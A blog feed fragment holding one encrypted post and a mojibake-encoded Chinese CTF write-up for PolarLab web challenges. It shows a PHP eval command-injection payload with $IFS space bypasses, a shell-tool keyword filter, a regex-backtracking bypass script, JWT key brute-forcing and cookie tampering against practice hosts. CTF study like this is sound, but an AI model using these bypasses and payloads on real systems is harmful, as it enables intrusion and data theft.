2cb37cc6f350f90ed3685d30c69798a2416534a81a2108d40600686dbaae66bf8ee4798b63d8019067b21f5e859a90ccf74713eb38a4476b4a44c2794f16b6b620f591d18767576abcf2491cf39c33e84f55bc272d287e1f7c80c2afdbd74c631112ef6b7215876b827049134148f63abcbe567ca76b3df389406c0f2642c51ff555731a8b33bd31f9435be49361f2f2512c57a8795aaae1cfbaedbb0e9aa7054dbbb23666864767492a74d0f847557f2706d8815d733df2e371f8585bb41cebc0bb21a82e644095dacc66eb941ab982ccd04dc00f1c0fd976563568a071f64b98fc2e1a44658282d243d8b84db2202204c443e4c4e26bf73fb533ebd80662d9df174527fc07a06c8a9da5780cbbaeecb50a06d62f1d772d2dcdd69e7fab7bcffbfe802697ff036282546d51f57040968adf9770cfe0028d1354edb52970267083828fec213d5384d1088b5fe7fb4fb3aa71bd0b77bc21f32f681fac1be8b459b6c3e1f5c483cc5d7d81c7349a6d9fcc719b5ba7d57bc15dffd5834a29af34596bfcdb87202b5dbd4e7f66e6eddac1adad5604cdd20dfc3a1e7df60ba22c637586f8ae8d8fe8dadff62e4bedcad46d0e299d779041abd8092d48e6032f210dc54b00e294a35588e284ac81edbe4afcaa8638c775c406dbd611fd0c95992d75da1e9827ae1bf6e9b262985d8f3116eeba0cada4d5a3dd421a9d1cd0bcf2ed3ca700ca1b89951bfd852b05a817ef5941687ec3b295ca11575ddc9fc0a8c436e8d65cf9f4f41ec52bc0c185284862ec16cb740124995a880b7e9e5b92c9f513d3bf25da8802cfc03e2c255c4e59bfa94bcd555a4a392ad8eff5b97071649c419e989bc33de52d2709ad124a511b854813b46b42df276d8093d8fb0e4dc6810fb3b10c37155c24f1d249138543b2e07ef585a99a7a5ea9980e7bbe7bf7773bcc33efd21727f0096402feabf346d232676bceec7f4ec0fac7a96663f3d6dc01a4717c8883e25012d4dd92db23a1e5bf89e538df67523e56e801de6e6aafa39f046e692a03549a40820622f4178ed75ad85cf79c266646695ed0aa053f7c3f403162fdd90d0b8c1f2ea48be5f99be3a5406f285fcd47eba4606e7902f67bbe47838a24ccc434f42e508693c08edf00a13c33dc47aefea0b20ca61538938b0beb243d300672a6742de1c4c5d3a036747a44a135193c186e62bbc6e9a741336438e385e41209811f2a52c8d0e13ab4df2cf6ac0a58212999ab3db3119e59a5a615778cf080614eb98e5facd12bfae8f7a388b8ce0c7767a1ad89bc8f9a81759ca7b5623241e02947003ee5aa023bda5209404b58010c997f20b5484b7a8604fe33bec7477c32af3ea75baf0284146329706ed7615afb0764c110f5168238dbfafc962b9befd0a48795b55dc8c6ed574327b5a51db27c63e069ba487865ac99b9616f09f500a50ae72b71586b69386331551d36c1a18c12932b85db558533c58a4b9f7a90daf5358730e0f0afcd91e8ace6a970ac37cf19d62f5468e54575a86094883847efd3369469596bc46be45bf5c69e5160a0e54bce12bf1f61a15d681a9db040f59b57b3d329219162bd0bcc0ba9ca33150ab72f102edcd1fec4785847729ff0f268cb876f696183c70879c2c2456141adf4a7c6debeaa658966bae88d6dfa6d3eb7b903ff5196d7d17d61527b24f96b9bb92f1e074cf1d0e17fe6d8fea5444f2dc727466850814318dde63ccea3a12268a332e9e9c5071ce2e2d1324b1f50524413ebf45a08692481ccaf9886d850ffcaaf2080fa80f4a2182655020bcfc80e997fe18cb0c12c02e4a7e372b5920c632aa9aa86771b139ead55d64fbe700c0b07d0a307bdbf81072de7c21e8b85c55d1566df2ee124a5ae4d45c28951cc4110029faed6a1107f927542879cc524e72323f3870cbf579c7c765b91c36d8a058f5f40fc1789d20c636fa1615aa017cfcb87271bc8b6ce8fafa987c299b288243ff0a5c919e3fa13ec31bb8539b2ce159b7dde1168648d1d142b48cc4ca427d61ea58081a4a75de51e97fba7aff270c91b62dc2c541118a9cf6dc47766fbcd82f728353f656700e85781ed89c5277656cff88cd6300bb65799f09a949b836f3bd386cff9ee555634351e1aaf5a6b9a83f377f142122f2cbb19dd8a65959baae575bfe07b2e4d89838065202efa19c802f400b97eb90740620e3349f7fb4ac1541403c4ae60cca41026b1f4289755472d93367c5ef8237358bbd613654038dc358ea414b965ace5e583ed59237577716fcda6c8b53a715765854a5035bf49a2c3a3563c3f63367acfab7f099492832788f993ee2268d93e70f0a0d5bae5af5b4a87b45474c0bc6f795f1100deb5f5e1a97ecba75a3d7e0d12efe2ff42b9dc30e65ffbc0d1e987b08b0bef30a3249270c797c03f4b7afdf866846cde15010b662989e9a7cbf85f8d34b414b94cc4655610387e69b026f8c041aa2fc0cd83c34fc7629ac275a20989bb684c2d449f043a7623f68704957e9f454513bd8711ea2661ea6dcacd4576778629cbc5a384ba9aaac5cc1a2eb464415ffeb492df26c8d1f19c3e70e000a633f386277cd5d7df51aaa56247ec1ddbd9e62c06fe2404c183beb2f1c7d4f91624930a7d36af9abc5b37bf99c80289bcb2214a0cfdd9637634b5538076cfb94a8b0af54df599da5c877779419544b65613c6e40ce530476f1723fe3ef2edc189b9a5b570680c94eed4fb2bc3a87cc32dc8bc44cbc8bd26f35e0b3c227a18528149846785f4589b8a9b86c06789185fb1341be65075a0452d1536512214a9416f4000aa2bcf4588133eb0099c12ac4afe175c4da1bc5d0766bea9c0efc5201d4415c5f168413c762141ab76eab0799e141656bbb340ec79d222f587374904d7c605b9d44ff1fe139d6a0f1f02e5a486c4aedbafb3d16bb785cc2617dfcd8f604548b8e978fdf4b03f83886de5dbcd506a90da931aaa02e77e863a777699ccfe72fe5d0c52be363cb07b69884dba20ae18fe972466ed79cb7f0b506f9b58ae79fbdc074a420e4c6a2a652211313ac9b92c02049a51919f02cf4be8e0a0c39a9972b18ac95b8aafa0dec266abd14ad8bac5dbbdd6b8a451501f6b5468fe649e32581fd6297c91759efe63a93db981657e00347cfe4849aa73331bbfd81f8902ef39b5079ef9dd14b2ffc59b9e0779a04a309bf15745fbbe175bfc2da2ab234621d98a02e04819f2c9e0ee9164ec80362e67ed9b4bd69f135906bad1d704607c96828a0486bb9d40ef851c6c177d827dec841c6b778c9fd6b9a7ca9e186a4846d69b63f9cb4db2a96b5bee81a36b6dcc2b465d554f3911c74352262b2660459cd2413bd2738039b0bfc06d3925b387e39752987589921c5a66acde50e3449fdc0d72d8553f4fda68063036403c62cc4f99e5b8afcf75524f62df23bdae5f4ee60ab3dc0dba4affd0f902a5d31644d3e60712f7536897b9031b14a933d925fedbaa63d20bbf083edd3a16eb99b6276f846168b15b11c2af4d3eee25b9a350062224a036a40858061bd1c970b7746c3e233c135cf5c171782e082aac6f0f08009e885c307fb30824f3bf11df19179552fc932f544ace163e154ae07c47d3023f5c2c74bbbd70565cf5f32157b5d15dcd2249e41fc8a35cbdfc1ed379627ae43418ec7ccbed2ba01856e9f4365153ceeeb1df496e7198b3de3e202eed4d9865e4041363cba729fc01aaf32f9675dc57a5a21f1adb017d9c96a2902f089d1d396abff90a91c043bf400571bb774c2f90331fc014edf959596e0619733cd091decb3a232ca0bf811648a77030725f2b790482c932294fcf1185ae240c75aa95b1b90dbb0632bf3245c5a09bd6f9f1f3dd6e0343afe45d2e0084a5235a784b34f77311549940b10a1e060596bf98a7207d7ac7757ab2c4172a6ca03786be486f1132ef8d85b358581e3ed0293bd8876f7fb82358e443c6d77fc11e253161c17dd46734714bb103d3943892ffb1f9681f75d9c6192273e045082826c9643ac72fc63ddcd53b0bf056d3e04d306f44e659b19f6c46899d6d25829463d3ee6001fd033830d85bb43601adb88bb220630dd943367803f5581169dcb18377dd933a48a6a0bf798702b1890a93c4ef7efc2bdc1e4b6aa3035e7e76d5b81be3fc6c83b04e3f89afe73fcd6d3641608c7ec4ab6ab51228b9f524626870d8b1b12792c88b12b0087b2a1a03ab2b5f55117fb24b4bd2d63bc987f87b55edbd090fef2a251504cd6881704ce5657f8b102d82cfeb10232adfa551e29a7d67db0229c25f8f9d8f0848c385f6717bd72cd1ba154da586148b6a90f3a0f51c1cf64c8539276e9d973f743a977179a25a18cead37d28d8883fe37b289b15ab1885a1710db5e82083505f1fb8f4491d95cf2b29f79e8029052e2ceb2076993bb4a3af649a23e1da1b6e6aa169ba27f509b6dd27877734620e766da67860d883eecb27f892acfef2ab1b78b4c48c22140a2ad212e947b0481d240eca1af7d39c5574b7bea11fdc7c231fe7b450010179cc7f20befef7541847be24491bf17d81ea26ab928fcfe0a5be96fbe0533ca16095358700442e31d5975b4fa75bb5768920ec4bc5f8b81ddd75595b6ba982e55a8dbdb7c683ba768db7eab64da5e9ce62d07d943383ccc514cb77cd47a62264e50b3491779af4ee2e70077776ef0a1985842c5a84a5d105ff8241036761e80d8a2801a48b4f4789ceeaa7434ad683a58b8565fca1e9ca9fa9276d40ea2e358dc46b3524ef6112625b20f15d6c9ddc3e8f522c15b2db68defdb01beb4809c1606f965f6d4da98d049a2b26db2bb5c564009bb127cd918652ae9c99d8d9e435462494a4122b8bcabf24f526936ac2b18e1f20f1c8ea7586944296afe2d58381ea31488df7349d182f5e4031226cd1781ef3a15008204ef47afb66107e9d76673793fd545e84cfdba4e4d8802e0a4c02c474d42d8753ddfe90e19ba10a5709638fc9b18048c14d0e672c18b9779346613c70d57eb9dc5c2eae875b90a8c69e99c62c4402e8767fa07408d219e4095248e0eaab58cd52398f029329695edc53a59ee258e149bc83c878b0fff1d2d94df890670ebc7d339e8b49876c5013063eaf67a70170fe420237651b3f7b34476d1cc895ae6366c7b9deb8347a6f58053c20231cd31c1451fd4025ee203daaff038066a8983ceda3189a5b76ac01d9522f9942f679def9674ba73e0a6e87e7b5985aa71507296892fc34fe7d0577339cabded33188e2a789b9c9b15d24070e38d1485faebf25e2717b5e1cd372337eeebafa9084b1ae9954658f28453d3463a7eba2d753d246c28deaa29db2d49b21587f6de6872bfe02cfbfa9026f8cdf9acff2d459e7af06da6abb139f46ade03f9d24355c4b282fe94577c16732a11a697311d70f9cc98c5878ea1c094c6c51901f8cdd2b641ac91871d99486916ad094111b1e13e4aae6435511efd95a5ea9e132ce7b8b632d02beabeb9540604a367383e352bc60daae2c113b5d74deb08af344af7e840c1ac46b1f1370dac7109d87c16c206ccb661ac27e16782ee44712aa49e5e5076f6e208ed308e382bc3dce27255c0f5c783f7b515578323071108b27c5e4cd59c991ebe837787baff4621bc5842fde079efb9fe4060905113613e64fd4ab86bde15239fe1736c8dd43cd095f096c382ac45bb0c97b02d2960a24e36de7643f0724c72b341c52dfbdfb80867a1ce79924955d5bad1c0c655e10941c22efc128cc2e836da4863d4ea3c471c540f3ceb8efa0b880d9b3c9574518ace6af8eff72038ce86e76b282e8bf9b22289f4533078f2a75dae06a4bb52153201fe2ecd2f8da54a6f64aa3708549e4fc34f9208c4830cab0e233bc3f2bc92d850b34141491c471eaf588b094cc885ae63dbedb095bc3213029e73bf0ce486926c5c30ac37437a4116317a7ef10bf9048a7891b139f619f30c1151f528fee702c49b255c4f7534a7c3bda13244c90bcdf72b4e22e97669cba095ce48cbc7742849227946933f2ee08a22ee796ec2e1e430fe96b09443c4edb2dc9798b0abc7149cc167725b9c6a4b0d3f63bb3b061c23772b4efcdaa27b878787614c0bff8e8d8cfa422b07c9aba4c7128fd6873ab08a2f0c33bc0ac11adc22248cb423f0403dcdd2088862792a0a4f066750f558deb1bbe1916a5298906a9e2aa4557ffb6f25c0d8c804c70c15c41487e4ac733f9a85f0373ed48922d53386e663e25980ebc6b62d90ecfe09735743492413e32b4bda362aa3035db76a47e9c9589e70589fe02432aceb5f14838502a9d310875acb95dba1df129f5f3a7535dc3310d8836e91d486d0858bc6ce31319e62c9d2ce733023c94b245674f8fc3a9caf8da695296b28c42aafe9b6c1df05cdd979be382327dede6164a90d4ab967c8d5d488fb2fe2d58ccc83f766289249798bd067dd1b2a10d267d32e4b5d42090c90f6c4d14204195293cc512e4ac8e3b6928ae0c7237f94bf8f0923772ef200cbdea803705f94754b3405998dbb26a907a82f2606931895cb2f25d1cab68fd07e6f87bcc81091af2390cfd10582a61dfebb5e25e82ae5b8504d895dc5a7bd55c820d5b9f83950482917fcde9965d2045da00562478f2617fe158c0987166a603a15e70add337af35dde8d30f4c89bb7c10dd3a8cc00f03db7cfc8d8c1d0e2b135f12c239b15d8dc74da8ff7648f5de49c809024e282ab9c890234f992a41955182c5a9cad9278add3de07de259cfd86b7163435cc43f4814efed868f931600fc2db60f3a4cd129386dfffca93239c57898563e4b5c10d2b5fea199d64096a29a6276daa90ed618ab9fa37cf6c3bb76b7d59fc4750bd105ebb1a1461e42fbdb9066ac083068eb9f0574ef3db0b091c4e5f06b5fce5c0bb77ce66aea9ec5f0abe3838a8ed6acfb6f3c5b124962638caf063eb6305c900b8bb85613d8058bfaf427a9f7f0e68c74498a4d4193081c8ae29e2fd1971dbaccf23f8c5ace4aaa1f1d595e9580eb369439bdc72a631a4f9066950ba9d6fb8060101bfaf77261d19a983ceb70e5b2e394d06ece55d6911d7dd92b3dee1e9ffb4ccef1b7265a4317b33fe8338cbeaffec03201b1a74237a0297049f03440740056de3036409aa388bbedccf6814e06d0a8f6ad7743dd4db5b8312c58455c34859e5b5256e54425665b68580133268992ddb339332ffcd2d38ed4269c15697382bd3e3bf3f1f01249dc1b84f8c17384a192f2b87d5a5d5d8826fbba5362d524cba2d4408171da9bdf297622a962e9b465bf1db4ae73014fd5a34b83e49bec5bfb60c71148ecb19dc16108e625f402cf9ccde33baf16f7dcba57d522634078984aa3f1ab66047d25ef109fe87eba151d7834b3e66c79eebcf40c447e37174966120c798f5da36249db3ae3beb132ad4fb53481461c4d32e7ef6fb13502c8e2aa8afbe0569dd5b0666678dd0f3bb0d54358cbf5f9e583367e89d6e5e8e6654ffd4f95681534debc21c4584010d9283d4902547a6780d0e0537f631bc88d41c06c32953bb2857810ac1af9680236dbf6c30687deed61dd078b5c10e31ca61e21783fe4c5b8ed5b9ab75f31b4169c9ff73271b6bb85c91bc474cee4bbcb85c32cc39cf04dc97d3db18ae62034ea03829a7f401ca92346665a5417a6fd9b8649ce3fd9e49260eb1795bd1d49f4523588946c1b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewStarCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PolarLab-web-Baby</title>
      <link href="/2024/09/21/PolarLab-web-Baby/"/>
      <url>/2024/09/21/PolarLab-web-Baby/</url>
      
        <content type="html"><![CDATA[<h4 id="swp-Ê≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø"><a href="#swp-Ê≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø" class="headerlink" title="swp(Ê≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø)"></a>swp(Ê≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø)</h4><p>ÂÖàÊâ´ÊèèÂæóÂà∞<code>.index.php.swp</code>ÔºåÂæóÂà∞Ê∫êÁ†Å</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">jiuzhe</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sys.*nb/is'</span><span class="token punctuation">,</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$xdmtql</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xdmtql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">jiuzhe</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sys nb'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'flag&#123;*******&#125;'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'true .swp file?'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nijilenijile'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ËÄÉÂØüÊ≠£ÂàôÊúÄÂ§ßÂõûÊ∫Ø</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token string">"sys nb"</span><span class="token operator">+</span><span class="token string">"hsad"</span><span class="token operator">*</span><span class="token number">1000000</span>url <span class="token operator">=</span> <span class="token string">"http://1ce7c85b-bed6-4e28-bf60-fcfb671efc81.www.polarctf.com:8090/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"xdmtql"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="ÁÆÄÂçïrce"><a href="#ÁÆÄÂçïrce" class="headerlink" title="ÁÆÄÂçïrce"></a>ÁÆÄÂçïrce</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">no</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i"</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what's up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$yyds</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yyds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$yyds</span><span class="token operator">==</span><span class="token string single-quoted-string">'666'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">no</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> nonono</code></pre><p>ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ËæìÂá∫Âπ∂ËøîÂõûÊúÄÂêé‰∏ÄË°åshellÁªìÊûú„ÄÇ<span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ‰∏çËæìÂá∫ÁªìÊûúÔºåËøîÂõûÊúÄÂêé‰∏ÄË°åshellÁªìÊûúÔºåÊâÄÊúâÁªìÊûúÂèØ‰ª•‰øùÂ≠òÂà∞‰∏Ä‰∏™ËøîÂõûÁöÑÊï∞ÁªÑÈáåÈù¢„ÄÇ<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Âè™Ë∞ÉÁî®ÂëΩ‰ª§ÔºåÊääÂëΩ‰ª§ÁöÑËøêË°åÁªìÊûúÂéüÊ†∑Âú∞Áõ¥Êé•ËæìÂá∫Âà∞Ê†áÂáÜËæìÂá∫ËÆæÂ§á‰∏ä„ÄÇÔºàÊõøÊç¢systemÔºâ</code></pre><p>ËæìÂá∫ÂáΩÊï∞</p><pre class="language-php" data-language="php"><code class="language-php">catÂáΩÊï∞ Áî±Á¨¨‰∏ÄË°åÂºÄÂßãÊòæÁ§∫ÂÜÖÂÆπÔºåÂπ∂Â∞ÜÊâÄÊúâÂÜÖÂÆπËæìÂá∫tacÂáΩÊï∞ ‰ªéÊúÄÂêé‰∏ÄË°åÂÄíÂ∫èÊòæÁ§∫ÂÜÖÂÆπÔºåÂπ∂Â∞ÜÊâÄÊúâÂÜÖÂÆπËæìÂá∫nl      Á±ª‰ºº‰∫écat <span class="token operator">-</span>nÔºåÊòæÁ§∫Êó∂ËæìÂá∫Ë°åÂè∑more    Ê†πÊçÆÁ™óÂè£Â§ßÂ∞èÔºå‰∏ÄÈ°µ‰∏ÄÈ°µÁöÑÁé∞ÂÆûÊñá‰ª∂ÂÜÖÂÆπless    ÂíåmoreÁ±ª‰ººÔºå‰ΩÜÂÖ∂‰ºòÁÇπÂèØ‰ª•ÂæÄÂâçÁøªÈ°µÔºåËÄå‰∏îËøõË°åÂèØ‰ª•ÊêúÁ¥¢Â≠óÁ¨¶head    Âè™ÊòæÁ§∫Â§¥Âá†Ë°åtail    Âè™ÊòæÁ§∫ÊúÄÂêéÂá†Ë°åsort    ÊñáÊú¨ÂÜÖÂÆπÊéíÂàó</code></pre><p>Á©∫Ê†ºÁªïËøá</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token variable">$9</span><span class="token variable">$IFS</span><span class="token variable">$9</span>ÈáçÂÆöÂêëÁ¨¶Ôºö<span class="token operator">&lt;</span><span class="token operator">></span>Ôºà‰ΩÜÊòØ‰∏çÊîØÊåÅÂêéÈù¢Ë∑üÈÄöÈÖçÁ¨¶ÔºâÊ∞¥Âπ≥Âà∂Ë°®Á¨¶<span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span><span class="token number">0</span>a ÂõûËΩ¶<span class="token operator">%</span><span class="token number">0</span>dÊç¢Ë°å</code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token operator">?</span>sys<span class="token operator">=</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sort$IFS/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">POST</span><span class="token punctuation">:</span> yyds<span class="token operator">=</span><span class="token number">666</span></code></pre><h4 id="ËúúÈõ™ÂÜ∞ÂüéÂêâË≠¶Â∫ó-js"><a href="#ËúúÈõ™ÂÜ∞ÂüéÂêâË≠¶Â∫ó-js" class="headerlink" title="ËúúÈõ™ÂÜ∞ÂüéÂêâË≠¶Â∫ó(js)"></a>ËúúÈõ™ÂÜ∞ÂüéÂêâË≠¶Â∫ó(js)</h4><p><img src="js.png" loading="lazy"></p><p>‰øÆÊîπÂâçÁ´Ø‰ªªÊÑèÊåâÈíÆid‰∏∫9Âç≥ÂèØ</p><h4 id="Âè¨Âî§Á•ûÈæô"><a href="#Âè¨Âî§Á•ûÈæô" class="headerlink" title="Âè¨Âî§Á•ûÈæô"></a>Âè¨Âî§Á•ûÈæô</h4><p><img src="js2.png" loading="lazy"></p><h4 id="seek-flag"><a href="#seek-flag" class="headerlink" title="seek flag"></a>seek flag</h4><p>Cookie:idÊîπ‰∏∫1 flag1:flag{7ac5b</p><p>ÊäìÂåÖÂìçÂ∫î  Flag2: 3ca8737a70f029d</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>ÁÑØÔºåÁà¨Ëô´Ë¶ÅÊòØÁà¨Âà∞ÊàëÁöÑflagÊÄé‰πàÂäû<span class="token operator">--</span><span class="token operator">></span></code></pre><p>Êü•Áúãrobots.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#flag3:c0ad71dadd11&#125;</span></code></pre><h4 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h4><p>ÂìçÂ∫îÂ§¥ÔºöFlag-is-admins-password</p><p>Èöè‰æøÊ≥®ÂÜåË¥¶Âè∑ÁôªÂΩïÊúâ‰∏™‰∫∫‰∏≠ÂøÉÂèØ‰ª•ÁúãÂà∞ÂØÜÁ†ÅÔºåÊäìÂåÖÂæóÂà∞jwt ‰∏çËøáË¶ÅÁàÜÁ†¥keyÔºàÁúãwpÊòØ4‰ΩçÂ§ßÂÜôÂ≠óÊØç<del>‰∏çÁü•ÈÅìÊÄé‰πàÁàÜÁöÑ ÊÅº</del></p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">1</span> <span class="token number">4</span> <span class="token parameter variable">-f</span> /usr/share/crunch/charset.lst ualpha <span class="token parameter variable">-o</span> ./4ualpha.txt</code></pre><p>ÁîüÊàêÂ≠óÂÖ∏ÁàÜÁ†¥ key‰∏∫SYSA Â∞ÜÁî®Êà∑ÂêçÊîπ‰∏∫adminÂç≥ÂèØÂæóÂà∞ÂØÜÁ†Å</p><h4 id="login"><a href="#login" class="headerlink" title="login"></a>login</h4><p>Ê∫êÁ†ÅÁªô‰∫ÜÊèêÁ§∫<code>&lt;!--20200101 20200101--&gt;</code></p><p>ÁôªÂΩï‰∏äÂéª Âè™ÊòæÁ§∫‰∫ÜÁôªÈôÜÊàêÂäü Ê≤°ÊÄùË∑Ø</p><p>Áúã‰∫ÜwpËØ¥ÊòØ‰ΩøÁî®20200102ËøîÂõû‰∫Üf ÁÑ∂Âêé‰æùÊ¨°ÂæÄ‰∏ãÁàÜÁ†¥üòÖ</p><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token punctuation">&#123;</span>dlcg<span class="token punctuation">&#125;</span></code></pre><h4 id="iphone-UAÊ†áËØÜ"><a href="#iphone-UAÊ†áËØÜ" class="headerlink" title="iphone(UAÊ†áËØÜ)"></a>iphone(UAÊ†áËØÜ)</h4><p><img src="iPhone.png" loading="lazy"></p><p>Â∞ùËØïÊâæ‰∏™iPhoneÁöÑUAÂ§¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment"># Safari Áî®Êà∑‰ª£ÁêÜÂ≠óÁ¨¶‰∏≤</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>iPhone<span class="token punctuation">;</span> <span class="token constant">CPU</span> iPhone <span class="token constant">OS</span> <span class="token number">13_5_1</span> like Mac <span class="token constant">OS</span> <span class="token constant">X</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">605.1</span><span class="token number">.15</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Version<span class="token operator">/</span><span class="token number">13.1</span><span class="token number">.1</span> Mobile<span class="token operator">/</span><span class="token number">15E148</span> Safari<span class="token operator">/</span><span class="token number">604.1</span><span class="token comment"># Áà¨Ëô´ÂíåÊú∫Âô®‰∫∫Áî®Êà∑‰ª£ÁêÜÂ≠óÁ¨¶‰∏≤</span>Mozilla<span class="token 